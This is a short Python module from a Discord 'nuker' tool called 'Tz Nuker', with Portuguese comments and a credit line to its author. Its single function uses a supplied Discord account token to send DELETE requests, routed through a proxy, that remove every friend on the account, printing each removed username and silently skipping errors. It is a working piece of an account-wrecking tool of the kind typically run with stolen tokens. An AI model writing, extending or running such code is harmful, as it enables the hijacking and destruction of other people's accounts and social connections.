# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).

import requests

from colorama import Fore

from util.plugins.common import getheaders, proxy

def UnFriender(token, friends):
    for friend in friends:
        try:
            #Delete all friends they have
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            print(f"{Fore.GREEN}Amigo removido: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")